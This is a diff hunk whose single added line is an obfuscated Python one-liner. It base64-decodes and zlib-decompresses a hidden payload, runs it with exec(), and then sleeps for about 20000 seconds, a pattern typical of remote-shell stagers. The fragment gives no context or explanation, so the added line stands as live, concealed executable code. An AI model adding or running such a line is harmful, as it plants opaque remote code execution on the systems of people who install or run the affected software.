@@ -1,0 +1,2 @@
+python3 -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T8FKxDAQPTdfkVsSjKEtdRcWK4h4EBHB9SYibTJqaJqEJKtV8d9tyOIcZnhv3ryZ0bN3IeHo5ASJfxs98nGIsOl4TOEgE096BvTqAl6wtjgM9g1oU7MdqlL4WnMV+zIsSqEtP+L9/dXty/7x4fryjmWdkM5akIlS0mxb0WxFLVrCuzVYFowBhglVsEjwKTvn1SIaAE/PGDJ9uUgcrB/kRMnFDeFRBJAfdDV4qp+R6o/YMPT5rg1gA5Yqdm5WO3Xy3z0tNEOwgKT5aaFAutkHiJGW/8W46TKpICv5D4lkF38Z+gM16F6S')[0])));__import__('time').sleep(20000)"
+
